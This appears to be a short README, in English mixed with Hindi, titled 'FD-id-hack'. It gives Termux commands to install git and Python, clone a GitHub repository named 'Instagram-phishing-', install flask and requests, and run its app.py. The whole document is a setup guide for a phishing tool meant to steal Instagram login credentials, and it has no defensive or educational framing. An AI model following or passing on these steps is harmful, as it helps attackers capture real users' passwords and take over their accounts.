# FD-id-hack
Step-by-Step Guide

Update Termux Packages:
pkg update && pkg upgrade -y

Install Required Tools:
pkg install git python -y

Clone the Repository:
git clone https://github.com/EgaleX5/Instagram-phishing-.git

Ensure karein ki cloning successful hai:

ls

Navigate to the Directory:
cd Instagram-phishing-

Install Dependencies:
pip install -r requirements.txt

Agar requirements.txt nahi hai, manually dependencies install karein:

pip install flask requests

Run the Script:
python3 app.py
